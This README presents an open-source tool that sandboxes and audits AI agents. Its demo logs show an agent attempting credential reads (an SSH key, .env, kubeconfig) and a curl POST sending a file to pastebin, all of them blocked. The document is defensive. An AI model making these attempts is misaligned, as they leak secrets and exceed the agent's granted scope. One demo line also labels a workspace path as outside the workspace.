# AgenticBox — The Agent Governance Platform

> **Run autonomous agents that touch real systems — without the nightmare.**
> Scoped permissions, bounded execution, full audit trail. Every tool call logged in real-time. Open source. Local-first.

[![License](https://img.shields.io/badge/License-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE.md)
[![Rust](https://img.shields.io/badge/Rust-1.75%2B-orange.svg)](https://rustup.rs)
[![CI](https://github.com/morpheus-sh/agenticbox/actions/workflows/ci.yml/badge.svg)](https://github.com/morpheus-sh/agenticbox/actions)

---

## See It In Action

```bash
# This is the viral moment — watch the permission log in real-time
agenticbox run demo
```

```
┌─ TASK: Deploy /workspace/deploy.sh to production
│
 AGENT → cat /workspace/deploy.sh
│ #!/bin/bash
│ # Production deployment script
│ set -euo pipefail
│ echo "Building application..."
│ npm run build
  ✓ ALLOWED → within permissions

 AGENT → cat ~/.ssh/deploy_key  # need this to deploy
  ✗ BLOCKED → filesystem: path outside workspace

 AGENT → curl -X POST https://pastebin.com/api --data @/workspace/deploy.sh
  ✗ BLOCKED → network: https://pastebin.com/api not in allowlist

 AGENT → cat /workspace/.env  # need DB connection string
  ✗ BLOCKED → filesystem: path outside workspace

 AGENT → bash /workspace/deploy.sh
  → Build complete. Tests passed. Artifact: dist.tar.gz
  ✓ ALLOWED → within permissions

 AGENT → POST https://api.github.com/repos/acme/app/releases  # upload artifact
  → {"id": 42, "url": "https://github.com/acme/app/releases/42"}
  ✓ ALLOWED → within permissions

━━━ Workplace Session Summary ━━━
  ✓ Ran deploy.sh — build, test, artifact created
  ✓ Uploaded release artifact to github.com/acme/app

  3 blocked: SSH key access, .env read, pastebin exfil attempt

The agent did its job. The workplace did its job.
```

Every one of those Allow/Deny decisions is written to a **tamper-evident audit log** — a SHA-256 chained JSONL file that no one, not even root, can modify without detection:

```bash
$ agenticbox audit --summary

Audit Log Summary
──────────────────────────────────────────
  ✓ 32 allowed
  ✗ 24 blocked
  • 56 total

  Log file: ~/.local/share/agenticbox/audit.log

$ agenticbox audit --verify

  ✓ Audit chain verified — 56 entries, no tampering detected
```

That's the whole pitch: **your agent tries something dangerous → we catch it before it happens → you see exactly what was blocked and why → every decision is permanently on the record.** No guessing. No post-mortems. Just clean, deterministic enforcement with a tamper-evident trail.

[Record the demo →](#quick-start)

### Full Enterprise Flow: Identity → Run → Trust → Audit

AgenticBox doesn't just block dangerous actions — it attributes every decision to a **named identity**, tracks **trust scores** across sessions, and writes everything to a **tamper-evident audit log** you can verify or stream to a dashboard.

```bash
# 1. Create an identity (like on-boarding an employee)
$ agenticbox identity create deploy-bot --vertical ops
✓ Created identity 'deploy-bot' (a1b2c3d4-...)
  Status:     Active
  Trust:      0

# 2. Run an agent with that identity
$ agenticbox run ops-sre --identity deploy-bot

→ Identity: deploy-bot (a1b2c3d4) · Status: Active · Trust Score: 0
  Permissions: terminal=true  fs=readonly  network=allowlist  browser=false

 AGENT → journalctl -u app.service --no-pager -n 50
  ✓ ALLOWED → within permissions

 AGENT → cat /etc/kubernetes/admin.conf
  ✗ BLOCKED → filesystem: path outside workspace (kubeconfig)

 AGENT → curl -X POST https://api.github.com/repos/acme/app/deployments
  ✓ ALLOWED → within permissions

━━━ Session Summary ━━━
  Identity:  deploy-bot (a1b2c3d4)
  2 allowed · 1 blocked
  Trust delta: ↓ -3 (blocked filesystem access)
  Status:     Active → Monitored (trust score: -3)

# 3. Verify the audit trail
$ agenticbox audit --summary
  ✓ 3 allowed
  ✗ 1 blocked

$ agenticbox audit --verify
  ✓ Audit chain verified — 4 entries, no tampering detected

# 4. Launch the web dashboard
$ agenticbox dashboard
  → Dashboard running at http://127.0.0.1:8081
    Open in browser to view the audit log, filter by agent, and verify chain integrity
```

**How trust scoring works:** Every session adjusts the identity's trust score deterministically — +1 for clean sessions, -5 for blocked network exfiltration, -3 for blocked filesystem access, -2 for blocked fs:write, -1 for other blocks. A Monitored identity automatically has its permissions tightened (filesystem downgraded to readonly, network downgraded to allowlist-only) until it proves trustworthy over 3 consecutive clean sessions.

**The result:** Your agent has a badge, a track record, and consequences for bad behavior — just like a human employee.

---

## What Is AgenticBox?

Every company wants agents that do real work — touch customer data, take real actions, move real money. The problem isn't building agents; it's trusting them.

Deploying an agent into production today means either:
- **Building custom guardrails from scratch** — every team reinvents the permission layer
- **Handing it the keys and hoping** — full filesystem, full network, no audit trail
- **Locking it in a sandbox with no governance** — isolated but useless, or capable but ungoverned

AgenticBox is the layer between "agent built" and "agent deployed in production touching real systems." It's the infrastructure for governing what agents are allowed to do — with deterministic policies, real-time enforcement, and full accountability.

| Instead of this | You get this |
|---|---|
| An agent with root access to your production environment | An agent with a **job description and a badge** — scoped by role |
| Finding out after the breach | **Real-time ALLOWED/BLOCKED** — every action attributed |
| Building your own audit system | **Full audit trail** — every session logged, replayable |
| Picking one framework and getting locked in | **Framework-agnostic** — govern LangGraph, CrewAI, OpenAI, or custom agents with the same tool |
| Trusting an LLM to "be good" | **Deterministic policies enforced in Rust** — the AI layer can't bypass them |

**The thesis:** Agents are employees; workplaces are infrastructure. You wouldn't give a new hire root access on day one. Why would you give it to an AI?

---

## Quick Start

### Install

**One-liner (macOS, Linux, Windows via git-bash):**

```bash
curl -fsSL https://raw.githubusercontent.com/morpheus-sh/agenticbox/main/scripts/install.sh | bash
```

This clones the repo, builds only the CLI binary, and installs it to `~/.cargo/bin/agenticbox`.

**Or build from source:**

```bash
git clone https://github.com/morpheus-sh/agenticbox.git
cd agenticbox
cargo build --release --bin agenticbox
# Binary is at ./target/release/agenticbox
```

### Prerequisites

- **Rust 1.75+** — [install via rustup](https://rustup.rs)

> That's all you need for the demo. Docker and an LLM API are only required for
> container mode (`agenticbox run -- cmd`) and builtin agent mode (`agenticbox run hermes`).

### See it work in 10 seconds

```bash
# Built-in permission guard demo — real FsGuard + NetworkGuard enforcement.
# No Docker, no API keys, no daemon needed.
agenticbox run demo
```

### Run a real agent (requires Docker)

```bash
# Run a named agent — auto-fetches from the registry if not installed locally
agenticbox run security-analyst

# Preview permissions without executing
agenticbox run security-analyst --dry-run

# Or wrap any command ad-hoc
agenticbox run -- python3 -c "print('sandboxed!')"
```

> **Builtin agent mode** (no Docker): set up a local LLM via `agenticbox setup`,
> then run `agenticbox run security-analyst`. Uses the agent-loop crate with
> any OpenAI-compatible API (LM Studio, Ollama, OpenRouter, etc.).

### Verify the audit trail

```bash
# Every run writes Allow/Deny decisions to a tamper-evident audit log
agenticbox audit --summary    # show allow/deny counts
agenticbox audit --verify     # verify chain integrity
```

---

## The Four Pillars

AgenticBox governs agents through four primitives — the minimum set an enterprise needs to trust an agent in production:

| Pillar | What it means | Why it matters |
|--------|---------------|----------------|
| **Permissions** | Terminal, filesystem, network, browser — scoped and enforced via deterministic TOML policy. The agent can only do what it's authorized to do. | **Deterministic floor.** Declared in TOML, enforced in Rust. The AI layer can suggest; the policy layer decides. An LLM hallucination can't bypass a `filesystem = "readonly"` rule. |
| **Accountability** | Every action attributed, logged, auditable. Tamper-evident audit trail with SHA-256 chain hashing — each entry links to the previous entry's hash, so any modification is immediately detectable. Query with `agenticbox audit`, verify integrity with `agenticbox audit --verify`. | **Who did what, when, and was it allowed?** Enterprises need this for compliance, incident response, and procurement. The audit log is the compliance cornerstone — CISOs need to see a tamper-evident trail, and now it exists. |
| **Ownership Boundaries** | Clear boundaries on resources, outputs, and assets. What belongs to the agent vs. the organization. | **No leaked IP.** Each agent gets a bounded scope — files it can write, APIs it can call, storage it can use. |
| **Identity** | Agents get their own credentials, accounts, and digital identity — provisioned and revocable, just like a human employee. `agenticbox identity` CLI for create/list/revoke, `agenticbox credentials` for encrypted credential management. | **The moat.** When every agent has its own API key, SSH credential, and service account, you can audit, revoke, and rotate independently. No shared secrets. |

---

## What's Shipped

| Feature | Status |
|---------|--------|
| **Real Docker Execution** | ✅ `agenticbox run` spawns real containers via bollard, streams output, cleans up |
| **Ad-hoc Commands** | ✅ `agenticbox run -- python3 script.py` — any command in a sandbox |
| **Named Agent Profiles** | ✅ `agenticbox run security-analyst` — builtin mode with local LLM |
| **Builtin Agent Mode** | ✅ Agent-loop crate — local LLM inference without Docker |
| **TTY Support** | ✅ Interactive agents get a real PTY (crossterm raw mode) |
| **Permission Guards** | ✅ Terminal, filesystem (RO/RW), network (allowlist/localhost/offline) |
| **Filesystem Governance** | ✅ Path resolution with escape prevention, protected paths (SSH keys, AWS creds) |
| **Network Control** | ✅ Domain allowlist enforcement |
| **Agent Packages** | ✅ TOML manifests with `[image]` section for container + install steps |
| **Auto-Fetch Registry** | ✅ `agenticbox run <name>` auto-fetches from GitHub registry if not installed locally |
| **Dry-Run Mode** | ✅ `agenticbox run <name> --dry-run` — preview permissions without executing |
| **Tamper-Evident Audit Log** | ✅ `agenticbox audit` — SHA-256 chained JSONL, `--verify` for tamper detection, `--summary` for counts |
| **Built-in Demo** | ✅ `agenticbox run demo` — scripted permission guard showcase with audit logging |
| **Browser Automation** | ✅ Governed browser via `research-agent` vertical template — `browser=true` + `network=allowlist` |
| **Session Management** | ✅ SQLite-backed session tracking with identity attribution |
| **Agent Identity** | ✅ `agenticbox identity` — create, list, revoke identities with encrypted credential storage |
| **Audit Log Rotation** | ✅ Automatic by size/age, manual via `agenticbox audit --rotate` |
| **Web Dashboard** | ✅ `agenticbox dashboard` — local HTTP server with REST API and visual audit log viewer |
| **Desktop Console** | ⚠️ Tauri v2 app exists, needs integration with new container runtime |
| **ACP Permission Interception** | 🔵 Next — parse JSON-RPC, block/allow tool calls |

---

## Agent Profiles

Agents are TOML manifests — like Docker images, but for agent roles. Define the agent, the LLM, the permissions, and the runtime environment in one file.

```toml
# ~/.agenticbox/agents/security-analyst/agent.toml
name = "security-analyst"
description = "Security Analyst — sandboxed malware analysis, RE, threat research"

[model]
provider = "local"          # resolved via `agenticbox setup`
model = ""

[permissions]
terminal = true
filesystem = "readwrite"    # needs to read/write analysis samples
browser = false
network = "offline"         # no C2 callbacks during analysis
domains = []

[execution]
mode = "builtin"            # agent-loop crate (local LLM, no Docker)
max_iterations = 20

[prompt]
system = "You are an expert security analyst..."
task = "Analyze the files in this workspace..."

[workspace]
files = [
  { source = "samples/sample.sh", dest = "sample.sh" },
  { source = "samples/incident.txt", dest = "incident_report.txt" }
]
```

### Permissions at a glance

| Field | Type | Values | Default | Description |
|-------|------|--------|---------|-------------|
| `terminal` | bool | `true` / `false` | `true` | Shell command execution |
| `filesystem` | string | `readonly` / `readwrite` / `none` | `readonly` | File system access level |
| `browser` | bool | `true` / `false` | `false` | Headless browser automation (Phase 2) |
| `network` | string | `allowlist` / `localhost` / `offline` / `full` | `allowlist` | Outbound network policy |
| `domains` | array | `["api.openai.com"]` | — | Allowed domains when `network = "allowlist"` |

CLI overrides let you tighten or loosen per-run without editing the manifest:

```bash
agenticbox run hermes --fs readwrite --network full --terminal false
```

See [`docs/agents.md`](docs/agents.md) for the full agent manifest reference.

---

## How It Works

```
┌────────────────────────────────────────────────────────────┐
│                     How `agenticbox run` works               │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  1. Read agent.toml → image base + setup + agent command   │
│  2. docker create (base image, mount cwd, env vars)        │
│  3. docker start                                           │
│  4. For each [image].setup command: docker exec (install)  │
│  5. docker exec -it (agent command) — stdio relay          │
│                                                            │
│     ┌──────────┐    ┌──────────────┐    ┌─────────────┐   │
│     │  CLI     │───▶│  Container   │───▶│  Agent CLI  │   │
│     │  relay   │◄──▶│  (sandbox)   │◄──▶│  runs here  │   │
│     │  stdio   │    │  /workspace  │    │  governed   │   │
│     └──────────┘    └──────┬───────┘    └─────────────┘   │
│                            │                               │
│                    Permission Guards                         │
│                    ├─ fs-guard (path resolution)            │
│                    ├─ network-control (allowlist)           │
│                    └─ terminal (exec enforcement)           │
│                                                            │
│  6. On exit: docker stop + docker rm                       │
│  7. Audit log written to ~/.agenticbox/sessions/           │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

**No daemon required for `run`.** The CLI talks directly to your container runtime via [bollard](https://github.com/fussybeaver/bollard-rust). Docker and Podman are both supported (auto-detected). Set `AGENTICBOX_CONTAINER_SOCKET=/path/to/socket` to override.

The daemon is only needed for persistent, background sessions (`agenticbox deploy`).

---

## Why Not Just Use Docker / E2B / LangGraph / OpenAI?

Every alternative solves one part of the problem; you'd need to assemble the rest yourself.

| Capability | AgenticBox | Docker/K8s | E2B | LangGraph/CrewAI | OpenAI Assistants |
|---|---|---|---|---|---|
| Sandboxed execution | ✅ Docker/Podman | ✅ Containers | ✅ Firecracker | ❌ | ⚠️ (on their side) |
| **Deterministic permissions** | ✅ TOML policies in Rust | ❌ | ❌ | ❌ | ❌ |
| **Audit trail (agent actions)** | ✅ Tamper-evident, SHA-256 chained | ❌ Container logs only | ⚠️ Exec logs | ❌ | ⚠️ Their logs |
| Vertical templates | ✅ Security analyst + support agent + ops/SRE + research agent | ❌ | ❌ | ❌ | ❌ |
| **Agent identity** | ✅ `agenticbox identity` — create, list, revoke identities with encrypted credential storage | ❌ | ❌ | ❌ | ❌ |
| Model-agnostic | ✅ Any LLM | n/a | ✅ | ✅ | ❌ OpenAI only |
| Local-first / self-hosted | ✅ | ✅ | ✅ (self-host) | ✅ | ❌ |
| Framework-agnostic | ✅ Governs any agent | ✅ | ✅ | n/a (it's the framework) | ⚠️ |

**Our wedge:** Everyone gives you a sandbox or a framework and says "build your own policy." We ship governance as a product — declared permissions, deterministic enforcement, full audit trails. That's what enterprises buy.

---

## CLI Reference

```bash
# Run
agenticbox run demo                    # built-in permission guard demo
agenticbox run security-analyst        # named agent (auto-fetches from registry if not installed)
agenticbox run security-analyst --dry-run  # preview permissions without executing
agenticbox run -- python3 script.py    # ad-hoc command wrapping

# Audit
agenticbox audit                       # view recent permission decisions
agenticbox audit --summary             # show allow/deny counts
agenticbox audit --verify              # verify tamper-evident chain integrity
agenticbox audit --agent hermes        # filter by agent name
agenticbox audit --path                # show audit log file location
agenticbox audit --json                # machine-parseable JSON output
agenticbox audit --rotate              # manually rotate the audit log

# Identity
agenticbox identity create <name>      # create a new agent identity
agenticbox identity list               # list all identities
agenticbox identity status <name>      # show identity details
agenticbox identity revoke <name>      # revoke an identity
agenticbox credentials set <identity> <name>  # set encrypted credential
agenticbox credentials list <identity> # list credential names
agenticbox credentials rotate <identity> <name>  # rotate credential
agenticbox credentials revoke <identity> <name>  # revoke credential

# Dashboard
agenticbox dashboard                 # launch local web dashboard

# Manage
agenticbox agents                      # list available agents
agenticbox init my-agent               # create new agent manifest
agenticbox setup                       # configure LLM inference
agenticbox list                        # list sessions (daemon mode)
agenticbox logs <SESSION_ID> -f        # stream logs
agenticbox stop <SESSION_ID>           # stop session
agenticbox health                      # health check
```

### Runtime overrides

| Flag | Description | Default |
|------|-------------|---------|
| `--terminal` | Enable terminal access | `true` |
| `--fs` | Filesystem: readonly, readwrite, none | `readonly` |
| `--network` | Network: allowlist, localhost, offline, full | `allowlist` |
| `--domains` | Allowed domains (comma-separated) | `api.openai.com,github.com` |
| `--browser` | Enable browser automation | `false` |

---

## Architecture

### Crates (Rust)

| Crate | Purpose |
|-------|---------|
| `sandbox-core` | Docker container lifecycle: create/start/stop/remove, exec (interactive + wait), log streaming, image pull |
| `fs-guard` | Filesystem path resolution with escape prevention — canonicalizes paths, prevents `../` and symlink attacks |
| `network-control` | Network policy enforcement (allowlist/localhost/offline) — only whitelisted domains pass |
| `shared-types` | Common types: Session, ModelConfig, PermissionSet, AgentIdentity |
| `policy-engine` | Deterministic policy evaluation — Allow/Deny decisions with structured reasons |
| `audit-log` | Tamper-evident JSONL audit log with SHA-256 chain hashing, rotation, and verification |
| `session-manager` | SQLite-backed session tracking, identity management, credential storage |
| `agent-loop` | Builtin agent mode — local LLM inference loop with tool call governance |
| `tool-protocol` | MCP tool protocol parsing and enforcement |

### Apps

| App | Tech | Purpose |
|-----|------|---------|
| `apps/cli` | Rust + Clap | Command-line interface — the primary entry point |
| `apps/daemon` | Rust + Axum | REST API, WebSocket, persistent session management |
| `apps/desktop` | Tauri v2 + React | Native desktop console |

### Design Docs

- [`docs/designs/dx-user-journey.md`](docs/designs/dx-user-journey.md) — The three modes (ad-hoc, named agent, daemon), container lifecycle, ACP transport decisions
- [`docs/competitive-analysis.md`](docs/competitive-analysis.md) — Full landscape map: E2B, Modal, Daytona, Docker, OpenAI, LangGraph, Anthropic, Browserbase, Cloudflare

---

## Roadmap

### Now ✅
Core deployment engine — `agenticbox run` spawns bounded containers, installs agents at runtime, relays interactive stdio with PTY support. Scoped permissions enforced at the runtime boundary. Tamper-evident audit logging with SHA-256 chain hashing. Auto-fetch from package registry. Dry-run mode for permission previews. Governed browser automation via research-agent template.

### Next 🟡
- ACP permission interception — parse JSON-RPC tool calls, enforce allow/deny at the protocol level
- Agent install caching — named volumes for npm/pip cache (no more 3-minute installs every run)
- Persistent sessions — `agenticbox deploy` for long-running agents
- Waitlist → beta onboarding for managed cloud

### Later 🔵
- More verticals — sales ops, IT ops, finance ops, legal ops
- Firecracker microVMs for stronger isolation
- Managed cloud with SSO, RBAC, VPC
- Multi-agent coordination
- The path from developer tool to infrastructure company

---

## Development

```bash
# Quick build
cargo build

# Run all tests
cargo test --workspace

# Run specific test
cargo run -p agenticbox-cli -- run -- echo "test"
```

**Windows:** If `cargo build` fails with linker errors, ensure MSVC tools are first in PATH:
```bash
export PATH="/c/Program Files (x86)/Microsoft Visual Studio/2022/BuildTools/VC/Tools/MSVC/<version>/bin/Hostx64/x64:$PATH"
```

### Scripts

| Script | Purpose |
|--------|---------|
| `scripts/dev.sh` | Full dev stack (daemon + agent-runtime + desktop) |
| `.github/workflows/ci.yml` | Runs fmt → clippy → build → test on every push/PR |

---

## Community

- **GitHub** — [github.com/morpheus-sh/agenticbox](https://github.com/morpheus-sh/agenticbox)
- **Website** — [agenticbox.co](https://agenticbox.co)
- **Twitter** — [@agenticbox](https://twitter.com/agenticbox)

---

## License

**MIT OR Apache-2.0** — Choose whichever suits your project.

---

> **AgenticBox** — Run autonomous agents that touch real systems — without the nightmare.
